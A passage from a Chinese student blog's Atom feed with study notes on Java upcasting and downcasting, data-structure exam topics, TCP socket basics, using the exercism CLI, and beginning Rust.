   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//父类类型 对象 = new 子类类型 ()</span></span><br><span class="line">        Father fa=<span class="keyword">new</span> <span class="title class_">Son</span>();</span><br><span class="line">        fa.eat();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//下面一句会报错 </span></span><br><span class="line">        <span class="comment">//The method paly() is undefined for the type Father Java(67108964)</span></span><br><span class="line">        fa.paly();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然实际运行时使用的是子类的方法，但是在编译阶段，看的左边的父类，父类中没有这个方法，所以直接编译不通过。父类无法调用子类独有的方法，如何解决这个问题？有两种方案，其一是在父类中增加一个空的play方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;爸爸吃饭&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其二是<strong>引用类型转换</strong></p><h4 id="引用类型转换"><a href="#引用类型转换" class="headerlink" title="引用类型转换"></a>引用类型转换</h4><h5 id="向上转型-自动转换"><a href="#向上转型-自动转换" class="headerlink" title="向上转型(自动转换)"></a>向上转型(自动转换)</h5><p>子类向父类转型，可以理解为儿子变为父亲。父类引用指向一个子类对象，就是向上转型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fteher fa=<span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure><p>父类有很多子类，而子类却只有一个父类，所以向上转型是自动的.</p><h5 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h5><p>父类向子类转型，需要强制转换，也就是指定转换类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Father fa=<span class="keyword">new</span> <span class="title class_">Son</span>();</span><br><span class="line"><span class="comment">//向下转型</span></span><br><span class="line"><span class="comment">//子类类型 子类变量名 =(子类类型) 父类变量名</span></span><br><span class="line">Son fa2=(Son) fa;</span><br><span class="line">fa2.play();</span><br></pre></td></tr></table></figure><p>在完成向下转型后，fa2的变量是子类的，方法是子类与父类的和。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">    <span class="type">int</span> age=<span class="number">44</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;爸爸吃饭&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fish</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;爸爸钓鱼&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">    <span class="type">int</span> age=<span class="number">22</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;儿子吃饭&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;儿子玩游戏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">Demo</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//父类类型 对象 = new 子类类型 ()</span></span><br><span class="line">        Father fa=<span class="keyword">new</span> <span class="title class_">Son</span>();</span><br><span class="line">        fa.eat();</span><br><span class="line">        <span class="comment">//下面一句会报错</span></span><br><span class="line">        Son fa1=(Son) fa;</span><br><span class="line">        System.out.println(fa1.age);</span><br><span class="line">        fa1.fish();</span><br><span class="line">        fa1.play();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爸爸吃饭</span><br><span class="line">22</span><br><span class="line">爸爸钓鱼</span><br><span class="line">儿子玩游戏</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着GitHub上的 27天成为java大神 项目学习Java。&lt;/p&gt;
&lt;h3 id=&quot;损失精度&quot;&gt;&lt;a href=&quot;#损失精度&quot; class=&quot;headerlink&quot; title=&quot;损失精度&quot;&gt;&lt;/a&gt;损失精度&lt;/h3&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;面试题：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;type&quot;&gt;short&lt;/span&gt; s=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, s = s+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;short&lt;/span&gt; s=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, s+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		上面两个代码有没有问题，如果有，那里有问题&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="language" scheme="http://example.com/tags/language/"/>
    
  </entry>
  
  <entry>
    <title>数据结构（考试篇）</title>
    <link href="http://example.com/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/"/>
    <id>http://example.com/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/</id>
    <published>2023-11-19T13:46:37.000Z</published>
    <updated>2023-11-19T13:46:37.102Z</updated>
    
    <content type="html"><![CDATA[<h3 id="二叉树的先序遍历、后序遍历、中序遍历"><a href="#二叉树的先序遍历、后序遍历、中序遍历" class="headerlink" title="二叉树的先序遍历、后序遍历、中序遍历"></a>二叉树的先序遍历、后序遍历、中序遍历</h3><p><strong>先序遍历：</strong>根节点—&gt;左节点–&gt;右节点</p><p><img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231108092718.png"></p><span id="more"></span><p>这个过程是递归的，比如说访问了左节点B之后不是去访问右节点C，而是去访问了以B为根节点的左节点D。顺序有个规律，可以看作是这个小人逆时针跑了一圈：A B D H I E J E C F K G</p><p><strong>后序遍历：</strong>左节点–&gt;右节点–&gt;根节点</p><p><img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231108093513.png"></p><p>按照递归<strong>左右根</strong>就能排出来，排序小技巧是如图所示，当成一串葡萄，逆时针剪下最外面的一个单一葡萄。</p><p><strong>中序遍历：</strong>左节点–&gt;根节点–&gt;右节点</p><p><img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231108094014.png"></p><p>小技巧是看作竖直方向上的投影，其顺序是：HDIBEJAFKCG</p><p>参考：<a href="https://blog.csdn.net/chinesekobe/article/details/110874773">数据结构——二叉树先序、中序、后序及层次四种遍历（C语言版）_中序遍历-CSDN博客</a></p><h3 id="度、节点计算"><a href="#度、节点计算" class="headerlink" title="度、节点计算"></a><strong>度、节点计算</strong></h3><p><strong>入度</strong>为0则为根节点，其余节点入度为1</p><p><strong>出度</strong>则是子节点的个数，可取0、1、2。</p><p>总入度&#x3D;节点总数-1，总入度&#x3D;总出度</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">记节点出度为0、1、2的节点数分别为n0、n1、n2</span><br><span class="line">则总出度<span class="attribute">N</span>=n1+n2*2</span><br><span class="line">总结点数=n0+n1+n2</span><br><span class="line">根据 总入度=节点总数-1，总入度=总出度</span><br><span class="line">则n0+n1+<span class="attribute">n2-1</span>=n2*2+n1</span><br><span class="line">所以<span class="attribute">n0</span>=n2+1</span><br></pre></td></tr></table></figure><p>一棵二叉树有十个度为2的节点，5个度为1的节点，求节点总数。10*2+5&#x3D;n-1     n&#x3D;25+1&#x3D;26   26&#x3D;15&#x3D;11     </p><p>节点总数等于度1+度2+度0，因此求出度为0的节点即可，即度2+1，所以10+1&#x3D;11个。</p><p>参考：<a href="https://blog.csdn.net/qq_41126936/article/details/126539411">【精选】二叉树——度以及节点数的计算_二叉树节点和度的计算_不想做咸鱼的霉霉的博客-CSDN博客</a></p><h3 id="计算时间复杂度"><a href="#计算时间复杂度" class="headerlink" title="计算时间复杂度"></a>计算时间复杂度</h3><ul><li>用常数1取代所有加法常数 O(199)—-&gt;O(1)</li><li>只保留最高阶O(n^2+n)—&gt;O(n^2)</li><li>去除最高阶常数O(2*N^2)—-&gt;O(N^2)</li></ul><p><img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231108104447.png"></p><p>O(2*N+10)—-&gt;O(N)</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">下面程序段的时间复杂度为（）。</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span><span class="comment">(i&lt;=n)</span></span><br><span class="line"></span><br><span class="line">i=i*<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">(A)</span> O<span class="comment">(n)</span>       <span class="comment">(B)</span> O<span class="comment">(3n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(C)</span> O<span class="comment">(log3n)</span>   <span class="comment">(D)</span> O<span class="comment">(n3)</span></span><br></pre></td></tr></table></figure><p>正确答案是c，3^log3n&#x3D;n。</p><h3 id="存取结构"><a href="#存取结构" class="headerlink" title="存取结构"></a>存取结构</h3><p>顺序存取和随机存取</p><p><strong>随机存取（Random Access）</strong>，指的是当存储器中的数据被读取或写入时，所需要的时间与该数据所在的物理地址无关，数组采用的就是随机存取，通过下标进行存取，存取arr[1]和存取arr[100]没有时间上的区别</p><p><strong>顺序存取（Sequential access）</strong>是一种按记录的逻辑顺序进行读写操作的存取方法，所需的时间与数据所在的位置有关。</p><h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><p>顺序、链式、索引、哈希存储，后三个可以归为随机存储。</p><h4 id="顺序存储："><a href="#顺序存储：" class="headerlink" title="顺序存储："></a>顺序存储：</h4><p>相邻的数据存储在物理位置上相邻的存储单元。</p><p>优点：节省存储空间、可以实现随机存取</p><p>缺点：修改不方便、产生磁盘碎片</p><p><strong>随机存储：</strong></p><p>相邻的数据物理位置可以不相邻。</p><p>优点：不会产生磁盘碎片、修改数据方便</p><p>缺点：占用空间大、查找时比顺序存储慢，且只能实现顺序存取</p><h3 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h3><p><strong>树</strong>是一种非线性数据结构，树由唯一的根和若干互不相交的子树组成。<img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115095442.png"></p><p><strong>森林</strong>是树的集合。<img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115095612.png"></p><p><strong>树到二叉树</strong>的转化规则是：左孩子右兄弟。每个节点左指针指向第一个孩子，右指针指向他在树中相邻的兄弟。根节点没有兄弟，所以对应的二叉树无右子树。<img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115101837.png"></p><p>森林到二叉树，先将森林里的每棵树转为二叉树，然后再第一棵树转换的二叉树的右子树接上第二棵树转化的二叉树。<img src="/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115102215.png"></p><p>参考：<a href="https://blog.csdn.net/mynaiskey/article/details/124842989">树、森林与二叉树的转换_已知树的结点数怎么求森林的左右子数-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;二叉树的先序遍历、后序遍历、中序遍历&quot;&gt;&lt;a href=&quot;#二叉树的先序遍历、后序遍历、中序遍历&quot; class=&quot;headerlink&quot; title=&quot;二叉树的先序遍历、后序遍历、中序遍历&quot;&gt;&lt;/a&gt;二叉树的先序遍历、后序遍历、中序遍历&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;先序遍历：&lt;/strong&gt;根节点—&amp;gt;左节点–&amp;gt;右节点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2023/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E8%80%83%E8%AF%95%E7%AF%87%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231108092718.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="数据结构" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络（一）</title>
    <link href="http://example.com/2023/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://example.com/2023/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-11-19T13:44:59.000Z</published>
    <updated>2023-11-19T13:44:59.840Z</updated>
    
    <content type="html"><![CDATA[<h3 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h3><p>指的是操作系统中的<strong>网络控制软件</strong>。</p><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><p>套接字的实体就是<strong>通信控制信息</strong>，在协议栈的内部有一块专门用于存储控制信息的内存空间，具体是什么呢？通信对象的IP、端口号、通信状态等。协议栈是根据套接字中记录的控制信息来工作的。在终端使用netstat命令显示套接字内容<img src="/2023/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115020243.png"></p><span id="more"></span><p>上图的每一行实际上就相当于一个套接字，拿一个具体的来说</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">TCP</span>    <span class="number">192.168.101.101:53369</span>  <span class="number">39.137.107.210</span>:https   ESTABLISHED     <span class="number">11844</span></span><br></pre></td></tr></table></figure><p>PID为11844的程序正在使用IP地址为192.168.101.101的网卡与IP地址为39.137.107.210的对象进行通信，http指代特定端口，53369是本机使用的端口。</p><p>通信操作中使用的<strong>控制信息</strong>分为两类。 </p><p>（1）头部中记录的信息 </p><p>（2）套接字（协议栈中的内存空间）中记录的信息</p><h2 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h2><h3 id="创建套接字"><a href="#创建套接字" class="headerlink" title="创建套接字"></a>创建套接字</h3><p>创建套接字时，首先分配一个套接字所需的内存空间，然后向其 中写入初始状态。</p><h3 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h3><p>创建套接字后，应用程序调用connect，随后协议栈将本地的套接字与服务器的套接字进行<strong>连接</strong>。这里的连接指的是通信双方交换控制信息。客户端会将IP地址和端口号等信息告知服务器。</p><h4 id="连接的具体操作"><a href="#连接的具体操作" class="headerlink" title="连接的具体操作"></a>连接的具体操作</h4><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect（<span class="attribute">&lt; 描述符 &gt;</span>, <span class="attribute">&lt; 服务器 IP 地址和端口号 &gt;</span>, …）</span><br></pre></td></tr></table></figure><p>客户端会创建一个包含表示开始数据收发操作的控制信息<strong>头部</strong>，其中最重点的部分是接收方和发送方的端口号。<img src="/2023/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115022815.png"></p><p>随后头部的SYN会被设置为1表示连接。到此TCP头部创建好了，接下来TCP模块会将信息传递给IP模块。IP模块负责执行网络包的收发操作，网络包经IP模块通过网络到达服务器，服务器的IP模块将接收到的数据传递给TCP模块，服务器的TCP模块根据TCP头部信息找到端口号对应的套接字。接下来服务器的TCP模块工作流程和上述客户端工作流程相同。网络包到达客户端后会通过IP模块到达TCP模块，并通过头部信息确认连接是否成功，如果SYN为1则代表成功，这时会向套接字中写入服务器的IP地址和端口号等信息。</p><p>我们可以认为连接完毕后有一个管子将客户端和服务器的两个套接字连接起来了，往后通过这根管子收发数据。连接操作完成后控制流被交回到应用程序。</p><h3 id="收发数据"><a href="#收发数据" class="headerlink" title="收发数据"></a>收发数据</h3><p>连接完成后进入收发阶段。应用程序首先会调用write将要发送的数据交给协议栈，协议栈收到数据后执行发送操作。</p><p>协议栈并不是已收到数据就进行发送操作的，这样会产生大量的小网络包，导致网络效率下降。通常会累计一定的数据长度才会发送。说到长度，有两个比较重要的参数：</p><p><strong>MTU</strong>：一个网络包的最大长度，以太网中一般为 1500 字节。 </p><p><strong>MSS</strong>：除去头部之后，一个网络包所能容纳的 TCP 数据的最大 长度。</p><p>如果数据长度很大，则会被拆分会若干个块<img src="/2023/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115030254.png"></p><h4 id="确认信息是否到达"><a href="#确认信息是否到达" class="headerlink" title="确认信息是否到达"></a>确认信息是否到达</h4><p>通过“序号”和“ACK 号”可以确认接收方是否收到了网络包。</p><p><strong>ACK号：</strong>与头部相对距离。</p><h3 id="断开并删除套接字"><a href="#断开并删除套接字" class="headerlink" title="断开并删除套接字"></a>断开并删除套接字</h3><p>客户端应用程序调用close断开到戒子，结束数据收发操作。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;协议栈&quot;&gt;&lt;a href=&quot;#协议栈&quot; class=&quot;headerlink&quot; title=&quot;协议栈&quot;&gt;&lt;/a&gt;协议栈&lt;/h3&gt;&lt;p&gt;指的是操作系统中的&lt;strong&gt;网络控制软件&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;套接字&quot;&gt;&lt;a href=&quot;#套接字&quot; class=&quot;headerlink&quot; title=&quot;套接字&quot;&gt;&lt;/a&gt;套接字&lt;/h3&gt;&lt;p&gt;套接字的实体就是&lt;strong&gt;通信控制信息&lt;/strong&gt;，在协议栈的内部有一块专门用于存储控制信息的内存空间，具体是什么呢？通信对象的IP、端口号、通信状态等。协议栈是根据套接字中记录的控制信息来工作的。在终端使用netstat命令显示套接字内容&lt;img src=&quot;/2023/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231115020243.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>ecercism本地搭建即上传</title>
    <link href="http://example.com/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-11-02T18:09:08.000Z</published>
    <updated>2023-11-02T18:09:08.074Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://exercism.org/">exercism</a>一个界面简洁，功能强大的开源学习平台，目前已经支持67种语言的学习。<img src="/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20231103015318.png"></p><span id="more"></span><p>最近想学一下Android安全，Java课上也没好好听，于是来这里学习一下Java，学习路线是看书+实践，书是《Java基础核心总结》相当的短小精悍，实践就是在exercism这个平台上了。</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>第一种是使用<strong>在线</strong>的编辑器：很好用，就是打开的时候卡卡的，于是就选择了在本地搭建。</p><p>第二种本地环境：这里是详细的教程<a href="https://exercism.org/docs/using/solving-exercises/working-locally">Working Locally | Exercism’s Docs</a>，主要记录一下如何下载题目和上传。</p><h4 id="题目的下载"><a href="#题目的下载" class="headerlink" title="题目的下载"></a>题目的下载</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exercism download --exercise=lasagna --track=java</span><br></pre></td></tr></table></figure><p>下载命令在每个练习的右侧</p><p><img src="/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20231103020216.png"></p><p>直接复制在终端运行即可</p><p><img src="/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20231103020323.png"></p><h4 id="题目的上传"><a href="#题目的上传" class="headerlink" title="题目的上传"></a><strong>题目的上传</strong></h4><p>我们用vscode直接打开刚才下载好的那个文件夹，在src&#x2F;main目录下找到我们要修改的源文件，补充并保存。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exercism submit src/main/java/Lasagna.java</span><br></pre></td></tr></table></figure><p>这个命令不用记，在每个题目附件的help文档都能找到<img src="/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20231103020608.png"></p><p>运行结果如下<img src="/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20231103020742.png"></p><p>点击下方链接即可查看结果。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://exercism.org/&quot;&gt;exercism&lt;/a&gt;一个界面简洁，功能强大的开源学习平台，目前已经支持67种语言的学习。&lt;img src=&quot;/2023/11/03/ecercism%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%8D%B3%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20231103015318.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="language" scheme="http://example.com/tags/language/"/>
    
  </entry>
  
  <entry>
    <title>rust入门（一）</title>
    <link href="http://example.com/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://example.com/2023/10/15/rust%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-10-15T15:36:38.000Z</published>
    <updated>2023-10-15T15:36:38.494Z</updated>
    
    <content type="html"><![CDATA[<p>听闻rust大名已久，正巧赶上2023 秋冬季开源操作系统训练营，就来学习啦。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello,world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><p>从最经典的打印hello world开始，可以看到和c语言比较像，都是在main函数中执行，不同的是不需要头文件，而且打印方法非常的多元。</p><h3 id="println！"><a href="#println！" class="headerlink" title="println！"></a>println！</h3><p>这样，从这个方法，可以看出 <strong>{}</strong> 相当于c语言中的占位符 <strong>%d</strong>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span>=<span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello &#123;&#125; &quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span>=<span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello 